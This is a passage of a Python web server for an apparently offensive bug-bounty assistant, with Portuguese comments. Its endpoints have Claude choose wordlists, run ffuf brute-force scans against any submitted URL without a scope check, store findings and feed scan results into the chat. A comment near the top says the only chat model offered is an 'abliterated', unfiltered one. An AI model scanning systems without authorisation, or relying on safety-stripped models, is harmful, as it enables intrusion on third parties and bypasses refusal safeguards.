    user_msg = "\n".join(parts)
    return await _stream_response(user_msg, model)


@app.get("/api/models")
async def list_models():
    # X-ONE: opção ÚNICA — só o modelo abliterated (sem filtro). Não expõe Claude
    # nem os outros modelos do Ollama, pra o seletor ter uma escolha só.
    return {"models": [OLLAMA_MODEL], "claude_active": False}


@app.get("/api/version")
async def get_version():
    # Rodapé da interface lê daqui pra confirmar qual versão está no ar.
    return {"version": XONE_VERSION}


@app.post("/api/clear")
async def clear_history(request: Request):
    body = {}
    try: body = await request.json()
    except Exception: pass
    sid = (body.get("session_id") or "").strip()
    if sid:
        _hist(sid).clear()          # limpa só a conversa desta sessão
    else:
        _HISTORIES.clear()          # sem sid → limpa todas (compat)
    return {"ok": True}


# ── Session endpoints ────────────────────────────────────────────────────────
@app.get("/api/sessions")
async def list_sessions():
    with _db() as conn:
        rows = conn.execute(
            "SELECT id, title, created_at, updated_at, messages FROM sessions "
            "ORDER BY updated_at DESC LIMIT 5"
        ).fetchall()
    result = []
    for r in rows:
        msgs = json.loads(r["messages"])
        count = sum(1 for m in msgs if m["role"] == "user")
        result.append({
            "id":         r["id"],
            "title":      r["title"],
            "created_at": r["created_at"],
            "updated_at": r["updated_at"],
            "msg_count":  count,
            "active":     r["id"] == current_session_id,
        })
    return {"sessions": result}


@app.get("/api/sessions/{session_id}")
async def get_session(session_id: str):
    with _db() as conn:
        row = conn.execute(
            "SELECT * FROM sessions WHERE id=?", (session_id,)
        ).fetchone()
    if not row:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"id": row["id"], "title": row["title"], "messages": json.loads(row["messages"])}


@app.post("/api/sessions/{session_id}/restore")
async def restore_session(session_id: str):
    with _db() as conn:
        row = conn.execute(
            "SELECT * FROM sessions WHERE id=?", (session_id,)
        ).fetchone()
    if not row:
        return JSONResponse({"error": "not found"}, status_code=404)
    # Carrega a conversa da BD para a memória desta sessão. O frontend passa a
    # usar este session_id (adopta-o), continuando a conversa a partir daqui.
    msgs = json.loads(row["messages"])
    _HISTORIES[session_id] = list(msgs)
    return {"ok": True, "messages": msgs, "session_id": session_id}


@app.delete("/api/sessions/{session_id}")
async def delete_session(session_id: str):
    with _db() as conn:
        conn.execute("DELETE FROM sessions WHERE id=?", (session_id,))
        conn.commit()
    _HISTORIES.pop(session_id, None)   # remove também da memória, se existir
    return {"ok": True}


# ── Findings endpoints ───────────────────────────────────────────────────────
@app.post("/api/findings")
async def add_finding(request: Request):
    body = await request.json()
    finding = {
        "id":       str(uuid.uuid4())[:8],
        "ts":       datetime.now().strftime("%H:%M:%S"),
        "date":     datetime.now().strftime("%Y-%m-%d"),
        "vuln_type": body.get("vuln_type", "Unknown"),
        "url":      body.get("url", ""),
        "payload":  body.get("payload", ""),
        "severity": body.get("severity", "Medium"),
        "context":  body.get("context", ""),
        "tool":     body.get("tool", "AVEONE"),
        "param":    body.get("param", ""),
        "evidence": body.get("evidence", ""),
    }
    findings_store.append(finding)
    _save_findings()
    log.info(f"Finding: [{finding['severity']}] {finding['vuln_type']} @ {finding['url']}")
    return {"id": finding["id"], "ok": True}


@app.get("/api/findings")
async def get_findings():
    return {"findings": findings_store, "count": len(findings_store)}


@app.delete("/api/findings")
async def clear_findings():
    findings_store.clear()
    _save_findings()
    return {"ok": True}


@app.get("/api/reports")
async def list_reports():
    """List all saved .md reports."""
    files = sorted(REPORTS_DIR.glob("*.md"), key=lambda f: f.stat().st_mtime, reverse=True)
    return JSONResponse([
        {"name": f.name, "size": f.stat().st_size, "mtime": f.stat().st_mtime}
        for f in files
    ])


@app.get("/api/reports/{filename}")
async def download_report(filename: str):
    """Download a specific report file."""
    safe = "".join(c for c in filename if c.isalnum() or c in "-_.")
    if not safe.endswith(".md"):
        return JSONResponse({"error": "invalid"}, status_code=400)
    path = REPORTS_DIR / safe
    if not path.exists():
        return JSONResponse({"error": "not found"}, status_code=404)
    return FileResponse(path, media_type="text/markdown", filename=safe)


@app.get("/api/report")
async def get_report():
    if not findings_store:
        return JSONResponse({"error": "sem findings"}, status_code=404)
    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
    sorted_f = sorted(findings_store, key=lambda f: sev_order.get(f["severity"], 5))
    counts = {s: sum(1 for f in findings_store if f["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low", "Info"]}
    lines = [
        "# Security Report — X-ONE · AVEONE Platform",
        f"**Data:** {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"**Total findings:** {len(findings_store)}",
        " | ".join(f"**{s}:** {n}" for s, n in counts.items() if n > 0),
        "", "---", "",
    ]
    for i, f in enumerate(sorted_f, 1):
        lines += [
            f"## {i}. [{f['severity']}] {f['vuln_type']}",
            f"- **URL:** `{f['url']}`"      if f["url"]      else "",
            f"- **Parâmetro:** `{f['param']}`" if f["param"]    else "",
            f"- **Payload:** `{f['payload']}`" if f["payload"]  else "",
            f"- **Evidência:** {f['evidence']}" if f["evidence"] else "",
            f"- **Contexto:** {f['context']}"  if f["context"]  else "",
            f"- **Ferramenta:** {f['tool']}",
            f"- **Hora:** {f['date']} {f['ts']}",
            "",
        ]
    report_text = "\n".join(l for l in lines if l is not None)
    return JSONResponse({"report": report_text, "count": len(findings_store)})


@app.post("/api/transcribe")
async def transcribe(request: Request):
    """Receives WAV audio from browser and returns transcribed text via Google STT."""
    try:
        import io, speech_recognition as sr
        wav_bytes = await request.body()
        if not wav_bytes:
            return JSONResponse({"ok": False, "text": "", "error": "empty audio"})
        recognizer = sr.Recognizer()
        recognizer.energy_threshold = 300
        recognizer.dynamic_energy_threshold = True
        with sr.AudioFile(io.BytesIO(wav_bytes)) as source:
            audio = recognizer.record(source)
        text = recognizer.recognize_google(audio, language="pt-BR")
        return JSONResponse({"ok": True, "text": text})
    except sr.UnknownValueError:
        return JSONResponse({"ok": False, "text": "", "error": "not understood"})
    except sr.RequestError as e:
        return JSONResponse({"ok": False, "text": "", "error": f"STT service error: {e}"})
    except ModuleNotFoundError:
        return JSONResponse({"ok": False, "text": "",
                             "error": "SpeechRecognition not installed — run: pip install SpeechRecognition"})
    except Exception as e:
        return JSONResponse({"ok": False, "text": "", "error": str(e)})


@app.post("/api/aveone/inject-context")
async def aveone_inject_context(request: Request):
    """
    Recebe o dump completo do scan AVEONE e injeta no contexto PARTILHADO
    (_AVEONE_CTX), visível a todas as sessões de navegador. Assim a integração
    AVEONE continua a funcionar mesmo com o histórico de conversa isolado por sessão.
    """
    body    = await request.json()
    context = body.get("context", "").strip()
    target  = body.get("target", "alvo desconhecido").strip()
    if not context:
        return JSONResponse({"error": "contexto vazio"}, status_code=400)

    # Substitui o contexto AVEONE anterior (mantém só o scan mais recente)
    global _AVEONE_CTX
    _AVEONE_CTX = []

    user_ctx_msg = {
        "role":       "user",
        "content":    f"[AVEONE_SCAN_CONTEXT — {target}]\n\n{context}\n\nEstes são todos os resultados do meu scan AVEONE. Tens acesso completo a todos os findings, URLs, evidências e PoCs. Confirma que recebeste e indica um resumo executivo do que devo priorizar.",
    }
    _AVEONE_CTX.append(user_ctx_msg)

    # Gera resposta imediata do AI para confirmar e resumir
    full_reply = ""
    try:
        import anthropic as _ant
        _client = _ant.Anthropic(api_key=ANTHROPIC_API_KEY)
        msgs = [{"role": m["role"], "content": m["content"]} for m in _AVEONE_CTX]
        with _client.messages.stream(
            model=CLAUDE_MODEL, max_tokens=600,
            system=SYSTEM_PROMPT, messages=msgs
        ) as stream:
            for chunk in stream.text_stream:
                full_reply += chunk
    except Exception as exc:
        full_reply = f"Contexto AVEONE recebido para {target}. Pronto para analisar os findings."
        log.warning(f"inject-context AI error: {exc}")

    _AVEONE_CTX.append({"role": "assistant", "content": full_reply})
    log.info(f"inject-context: {len(context)} chars injetados para '{target}'")
    return {"ok": True, "summary": full_reply, "chars": len(context)}


@app.post("/api/aveone/ping")
async def aveone_ping():
    """AVEONE panel calls this every 30 s to signal it is open and authenticated."""
    global aveone_last_ping
    import time
    aveone_last_ping = time.time()
    return {"ok": True}


@app.get("/api/aveone/status")
async def aveone_status():
    """Returns whether the AVEONE panel is currently open and authenticated."""
    import time
    age = time.time() - aveone_last_ping if aveone_last_ping else None
    connected = age is not None and age < 90   # miss 2 polls = offline
    return {
        "connected":  connected,
        "seconds_ago": round(age, 1) if age is not None else None,
    }


_SF_WORDLISTS = {
    "common.txt":                                   "Geral — pequeno e rápido",
    "raft-medium-directories.txt":                  "Diretórios comuns (medium)",
    "raft-large-directories.txt":                   "Diretórios comuns (large)",
    "raft-medium-files.txt":                        "Ficheiros comuns (medium)",
    "raft-large-files.txt":                         "Ficheiros comuns (large)",
    "httparchive_directories_1m_2026_02_27.txt":    "HTTP Archive — 1M diretórios reais",
    "httparchive_php_2026_02_27.txt":               "HTTP Archive — paths PHP",
    "httparchive_aspx_asp_cfm_svc_ashx_asmx_2026_02_27.txt": "HTTP Archive — ASP.NET / .NET",
    "httparchive_jsp_jspa_do_action_2026_02_27.txt":"HTTP Archive — JSP / Java EE",
    "httparchive_spring_2026_02_27.txt":            "HTTP Archive — Spring Boot",
    "httparchive_laravel_2026_02_27.txt":           "HTTP Archive — Laravel",
    "httparchive_express_2026_02_27.txt":           "HTTP Archive — Node.js / Express",
    "httparchive_django_2026_02_27.txt":            "HTTP Archive — Django / Python",
    "httparchive_tomcat_2026_02_27.txt":            "HTTP Archive — Tomcat / JBoss",
    "httparchive_apiroutes_2026_02_27.txt":         "HTTP Archive — rotas de API REST",
    "httparchive_parameters_top_1m_2026_04_27.txt": "HTTP Archive — 1M parâmetros reais (IDOR/XSS/SSRF)",
    "api-endpoints-res.txt":                        "API endpoints comuns",
    "wordpress.txt":                                "WordPress paths",
    "aveone_sensitive.txt":                         "Ficheiros sensíveis (custom AveOne)",
    "httparchive_cgi_pl_2026_02_27.txt":            "CGI / Perl scripts",
}
_SF_WL_DIR = Path("/root/wordlists")


@app.post("/api/smart-fuzz")
async def smart_fuzz(request: Request):
    """Smart Fuzz automático: Claude detecta tecnologia, escolhe wordlist, executa ffuf."""
    import re as _re
    try:
        import anthropic as _anthropic
    except ImportError:
        return JSONResponse({"error": "anthropic not installed"}, status_code=500)

    try:
        body   = await request.json()
        target = body.get("url", "").strip()

        if not target:
            return JSONResponse({"error": "url obrigatória"}, status_code=400)
        if not target.startswith("http"):
            return JSONResponse({"error": "url deve começar com http"}, status_code=400)

        base_url = target.rstrip("/")

        # ── 1. HEAD request para headers da tecnologia ─────────────────
        headers_info = ""
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as cl:
                resp = await cl.head(base_url)
                headers_info = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        except Exception as e:
            headers_info = f"(não foi possível obter headers: {e})"

        # ── 2. Claude escolhe wordlist + extensões baseado na tecnologia ─
        wl_list_str = "\n".join(f"- {k}: {v}" for k, v in _SF_WORDLISTS.items())
        prompt = (
            f"És um expert em bug bounty.\n"
            f"URL alvo: {target}\n"
            f"Headers HTTP:\n{headers_info}\n\n"
            f"Wordlists disponíveis:\n{wl_list_str}\n\n"
            f"Analisa os headers e escolhe:\n"
            f"1. A wordlist mais adequada para esta tecnologia\n"
            f"2. Extensões relevantes para adicionar ao fuzzing (ex: .php, .bak, .env) — "
            f"lista vazia se não aplicável\n\n"
            f"Responde APENAS com JSON:\n"
            f'{{\"wordlist\": \"nome_exato.txt\", \"extensions\": [\".ext\"], '
            f'\"reason\": \"tecnologia detetada em 1 linha\"}}\n'
            f"Sem mais texto."
        )

        acl = _anthropic.AsyncAnthropic(api_key=ANTHROPIC_API_KEY)
        msg = await acl.messages.create(
            model=CLAUDE_MODEL, max_tokens=256, temperature=0,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = msg.content[0].text.strip()
        m = _re.search(r'\{.*\}', raw, _re.DOTALL)
        ai = json.loads(m.group()) if m else {}

        wl_name  = ai.get("wordlist", "common.txt")
        exts     = ai.get("extensions", [])
        reason   = ai.get("reason", "")

        # valida wordlist — fallback para common.txt
        wl_path = _SF_WL_DIR / wl_name
        if not wl_path.exists():
            wl_name = "common.txt"
            wl_path = _SF_WL_DIR / wl_name

        # ── 3. Executa ffuf ─────────────────────────────────────────────
        fuzz_url  = f"{base_url}/FUZZ"
        tmp_out   = f"/tmp/sf-{uuid.uuid4().hex}.json"

        cmd = [
            "ffuf",
            "-u", fuzz_url,
            "-w", str(wl_path),
            "-mc", "200,201,204,301,302,307,401,403,405",
            "-t", "40",
            "-timeout", "5",
            "-maxtime", "90",
            "-of", "json",
            "-o", tmp_out,
            "-s",
        ]
        if exts:
            cmd += ["-e", ",".join(exts)]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            await asyncio.wait_for(proc.communicate(), timeout=100)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()

        # ── 4. Parse resultados ──────────────────────────────────────────
        findings = []
        try:
            if os.path.exists(tmp_out):
                with open(tmp_out) as f:
                    ffuf_data = json.load(f)
                findings = ffuf_data.get("results", [])
                os.unlink(tmp_out)
        except Exception:
            pass

        return JSONResponse({
            "url":        target,
            "wordlist":   wl_name,
            "extensions": exts,
            "reason":     reason,
            "findings":   findings,
            "total":      len(findings),
            "command":    " ".join(cmd),
        })

    except json.JSONDecodeError:
        return JSONResponse({"error": "Claude retornou JSON inválido"}, status_code=500)
    except Exception as exc:
        log.error(f"smart-fuzz error: {exc}")
        return JSONResponse({"error": str(exc)}, status_code=500)


_ASSETNOTE_CDN  = "https://wordlists-cdn.assetnote.io/data/automated/"

_SF_WANTED_PREFIXES = [
    "httparchive_directories_1m_",
    "httparchive_apiroutes_",
    "httparchive_parameters_top_1m_",
    "httparchive_subdomains_",
    "httparchive_aspx_asp_cfm_svc_ashx_asmx_",
    "httparchive_cgi_pl_",
    "httparchive_django_",
    "httparchive_express_",
    "httparchive_js_",
    "httparchive_jsp_jspa_do_action_",
    "httparchive_laravel_",
    "httparchive_php_",
    "httparchive_spring_",
    "httparchive_tomcat_",
]


@app.get("/api/wordlist-update")
async def wordlist_update(request: Request):
    """SSE: descobre wordlists mais recentes no Assetnote CDN e baixa as que faltam."""
    import re as _re

    async def generate():
        def sse(ev, **kw):
            return f"event: {ev}\ndata: {json.dumps(kw)}\n\n"

        yield sse("status", msg="A buscar índice do Assetnote CDN...")

        try:
            async with httpx.AsyncClient(timeout=30, follow_redirects=True) as cl:
                r = await cl.get(_ASSETNOTE_CDN)

            # parse nginx HTML listing — extrai todos os .txt
            all_files = _re.findall(r'href="(httparchive_[^"]+\.txt)"', r.text)

            # para cada prefixo desejado, guarda o ficheiro mais recente (ordem lexicográfica = ordem de data)
            latest: dict[str, str] = {}
            for fname in all_files:
                for pfx in _SF_WANTED_PREFIXES:
                    if fname.startswith(pfx):
                        if pfx not in latest or fname > latest[pfx]:
                            latest[pfx] = fname
                        break

            yield sse("found", count=len(latest), files=list(latest.values()))

            downloaded = skipped = errors = 0

            for pfx, fname in latest.items():
                dest = _SF_WL_DIR / fname
                if dest.exists():
                    skipped += 1
                    yield sse("skip", file=fname, reason="já existe")
                    continue

                yield sse("downloading", file=fname)
                url = _ASSETNOTE_CDN + fname
                tmp = _SF_WL_DIR / (fname + ".tmp")

                try:
                    async with httpx.AsyncClient(timeout=300, follow_redirects=True) as dl:
                        async with dl.stream("GET", url) as resp:
                            total = 0
                            with open(tmp, "wb") as fh:
                                async for chunk in resp.aiter_bytes(65536):
                                    fh.write(chunk)
                                    total += len(chunk)

                    # remove versões antigas deste prefixo
                    for old in _SF_WL_DIR.glob(pfx + "*.txt"):
                        if old != dest:
                            old.unlink(missing_ok=True)

                    tmp.rename(dest)
                    downloaded += 1
                    yield sse("done", file=fname, size=total)

                except Exception as e:
                    tmp.unlink(missing_ok=True)
                    errors += 1
                    yield sse("error", file=fname, msg=str(e))

            yield sse("complete", downloaded=downloaded, skipped=skipped, errors=errors)

        except Exception as exc:
            yield sse("error", msg=str(exc))

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ─── MonRust3 integration ───────────────────────────────────────────────────
_MONRUST3_BASE = "http://127.0.0.1:8442"
_MONRUST3_TOKEN = os.getenv("MONRUST3_TOKEN", "")
_MONRUST3_HEADERS = {"Cookie": f"session={_MONRUST3_TOKEN}"}


@app.get("/api/monrust3/detail/{domain}")
async def monrust3_detail(domain: str):
    """Return MonRust3 domain detail (subdomains, findings, tokens, buckets)."""
    async with httpx.AsyncClient(timeout=15) as client:
        # Find domain ID
        search = await client.get(
            f"{_MONRUST3_BASE}/api/domains",
            params={"search": domain, "per_page": 10},
            headers=_MONRUST3_HEADERS,
        )
        domains = search.json().get("domains", [])
        domain_id = next(
            (d["id"] for d in domains if d["domain"] == domain), None
        )
        if domain_id is None:
            return JSONResponse({"error": "domain not found in MonRust3", "domain": domain}, status_code=404)
        detail = await client.get(
            f"{_MONRUST3_BASE}/api/domains/{domain_id}/detail",
            headers=_MONRUST3_HEADERS,
        )
        return detail.json()


@app.post("/api/monrust3/crawl")
async def monrust3_crawl(request: Request):
    """Create domain in MonRust3 (if not exists) and trigger full pipeline."""
    body = await request.json()
    domain = body.get("domain", "").strip()
    if not domain:
        return JSONResponse({"error": "domain required"}, status_code=400)
    async with httpx.AsyncClient(timeout=15) as client:
        # Try creating
        create_resp = await client.post(
            f"{_MONRUST3_BASE}/api/domains",
            json={"domain": domain},
            headers={**_MONRUST3_HEADERS, "Content-Type": "application/json"},
        )
        data = create_resp.json()
        domain_id = data.get("id")
        # If already exists, search for it
        if not domain_id:
            search = await client.get(
                f"{_MONRUST3_BASE}/api/domains",
                params={"search": domain, "per_page": 10},
                headers=_MONRUST3_HEADERS,
            )
            domains = search.json().get("domains", [])
            domain_id = next((d["id"] for d in domains if d["domain"] == domain), None)
        if not domain_id:
            return JSONResponse({"error": "could not create or find domain"}, status_code=500)
        crawl = await client.post(
            f"{_MONRUST3_BASE}/api/domains/{domain_id}/crawl",
            headers=_MONRUST3_HEADERS,
        )
        return {"domain": domain, "domain_id": domain_id, "crawl_status": crawl.status_code}


@app.get("/health")
async def health():
    ollama_ok = False
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r      = await client.get(f"{OLLAMA_URL}/api/tags")
            models = [m["name"] for m in r.json().get("models", [])]
        ollama_ok = any(OLLAMA_MODEL in m for m in models)
    except Exception:
        pass
    return {
        "status":     "online",
        "engine":     "claude" if ANTHROPIC_API_KEY else "ollama",
        "model":      CLAUDE_MODEL if ANTHROPIC_API_KEY else OLLAMA_MODEL,
        "claude_key": bool(ANTHROPIC_API_KEY),
        "ollama":     ollama_ok,
        "port":       PORT,
        "findings":   len(findings_store),
        "reports":    len(list(REPORTS_DIR.glob("*.md"))),
    }


# ── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import threading, webbrowser
    engine = f"Claude {CLAUDE_MODEL}" if ANTHROPIC_API_KEY else f"Ollama {OLLAMA_MODEL}"
    print(f"""
  ╔══════════════════════════════════════════╗
  ║   X-ONE v4.0                             ║
  ║   http://localhost:{PORT:<5}                ║
  ║   Engine : {engine:<31}║
  ╚══════════════════════════════════════════╝
""")
    # Abre o browser 1.5s depois de arrancar (tempo para o servidor iniciar)
    threading.Timer(1.5, lambda: webbrowser.open(f"http://localhost:{PORT}")).start()
    uvicorn.run(
        "brain_server:app",
        host="127.0.0.1",   # só localhost — acesso externo só via gateway /xone (auth)
        port=PORT,
        reload=False,
        log_level="warning",
    )
